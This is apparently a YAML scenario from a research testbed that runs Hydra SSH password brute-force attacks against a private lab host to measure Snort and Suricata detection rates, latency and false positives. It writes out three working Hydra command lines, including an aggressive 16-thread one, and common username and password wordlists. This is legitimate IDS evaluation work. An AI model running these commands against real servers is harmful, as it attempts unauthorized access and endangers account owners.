---
# ─────────────────────────────────────────────────────────────
# ARCHIVIRT Test Scenario: SSH Brute-force (Hydra)
# Author: Яснеманегре САВАДОГО (Аспирант СПБГУПТД)
# MITRE ATT&CK: TA0006 - Credential Access / T1110.001 - Brute Force: Password Guessing
# ─────────────────────────────────────────────────────────────

scenario:
  id: "SCN-002"
  name: "SSH Brute-force (Hydra)"
  description: >
    Performs SSH password brute-force attack using Hydra with a
    common wordlist. Tests IDS/IPS detection of credential stuffing
    and brute-force patterns.
  mitre_attack:
    tactic: "TA0006 - Credential Access"
    technique: "T1110.001 - Brute Force: Password Guessing"
  runs: 10

attacker:
  host: "10.0.4.10"
  user: "ubuntu"

targets:
  - host: "10.0.2.12"
    port: 22
    service: ssh

wordlists:
  users: "/opt/archivirt/wordlists/users.txt"
  passwords: "/opt/archivirt/wordlists/passwords.txt"

steps:
  - id: step1
    name: "SSH Brute-force — single user"
    tool: hydra
    command: >
      hydra -l testuser
      -P /opt/archivirt/wordlists/passwords.txt
      ssh://10.0.2.12
      -t 4 -w 10 -f -V
    description: "Brute-force SSH for user 'testuser' with password list"
    expected_detections:
      snort:    "ARCHIVIRT SSH Brute-force Attempt"
      suricata: "ARCHIVIRT SSH Brute-force"
    timeout_sec: 120

  - id: step2
    name: "SSH Brute-force — user list"
    tool: hydra
    command: >
      hydra -L /opt/archivirt/wordlists/users.txt
      -P /opt/archivirt/wordlists/passwords.txt
      ssh://10.0.2.12
      -t 4 -w 10 -f -V
    description: "Credential stuffing with both user and password lists"
    expected_detections:
      snort:    "ARCHIVIRT SSH Multiple Failed Auth"
      suricata: "ARCHIVIRT SSH Multiple Auth Failures"
    timeout_sec: 180

  - id: step3
    name: "SSH Brute-force — high speed (aggressive)"
    tool: hydra
    command: >
      hydra -l admin -P /opt/archivirt/wordlists/passwords.txt
      ssh://10.0.2.12
      -t 16 -w 3 -V
    description: "Aggressive parallel brute-force to trigger threshold rules"
    expected_detections:
      snort:    "ARCHIVIRT SSH Brute-force Attempt"
      suricata: "ARCHIVIRT SSH Brute-force"
    timeout_sec: 90

wordlists_content:
  users:
    - root
    - admin
    - ubuntu
    - testuser
    - user
    - sysadmin
    - operator
  passwords:
    - password
    - password123
    - admin
    - 123456
    - qwerty
    - letmein
    - ubuntu
    - root
    - test
    - 12345678

metrics:
  collect:
    - alert_count
    - false_positive_rate
    - detection_latency_ms
    - cpu_usage_pct
    - ram_usage_mb
  log_sources:
    snort:    "/var/log/snort/alert_fast.txt"
    suricata: "/var/log/suricata/fast.log"

expected_results:
  detection_rate_min_pct: 98.0
  false_positive_rate_max_pct: 2.0
  latency_max_ms: 60
